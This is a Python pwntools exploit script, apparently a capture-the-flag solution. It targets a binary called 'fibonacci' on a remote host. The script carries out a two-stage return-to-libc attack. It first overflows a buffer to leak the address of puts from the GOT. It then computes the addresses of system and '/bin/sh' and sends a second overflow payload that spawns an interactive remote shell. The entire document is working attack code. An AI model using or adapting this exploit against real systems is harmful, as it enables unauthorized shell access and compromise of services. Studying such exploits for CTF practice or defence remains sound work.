#!/usr/bin/env python3
from pwn import *

BIN  = "./fibonacci"
IP   = "141.85.224.106"
PORT = "31348"

context.bits = 64
context.endian = 'little'
context.binary = BIN
context.log_level = 'debug'
# io = process(BIN)
# gdb.attach(io)
io = remote(IP, PORT)

libc = ELF('./libc.so.6')
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.31.so')
system_libc_offset = libc.symbols['system']
puts_libc_offset = libc.symbols['puts']
bin_sh_offset = next(libc.search(b'/bin/sh'))

# Offsets found
print(hex(system_libc_offset))
print(hex(puts_libc_offset))
print(hex(bin_sh_offset))

pop_rdi_ret = 0x4007b3
puts_got = 0x601018
puts_plt = 0x400510
main = 0x4006b6

payload = b"A" * 0x1F + b"\x00" + b"B" * 8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main) + b"\n"

# Stage 1 - leak puts in libc

# Junk
io.recvuntil(b"?\n")

io.send(payload)

# Response junk
io.recvuntil(b"\n")

# Prompt again
io.recvuntil(b"\n")

#Exit loop
io.send(b"47\n")

# Stage 2 - call system
puts_libc = unpack(io.recvuntil(b"\n")[:-1].ljust(8, b"\x00"))
system_libc = puts_libc - puts_libc_offset + system_libc_offset
bin_sh_libc = puts_libc - puts_libc_offset + bin_sh_offset

# Payload to call system
payload = b"A" * 0x1F + b"\x00" + b"B" * 8 + p64(pop_rdi_ret) + p64(bin_sh_libc) + p64(system_libc) + b"\n"

# Junk
io.recvuntil(b"?\n")

# Send call to system
io.send(payload)

# Response junk
io.recvuntil(b"\n")

# Prompt again
io.recvuntil(b"\n")

# Exit loop
io.send(b"47\n")

# Get shell
io.interactive()
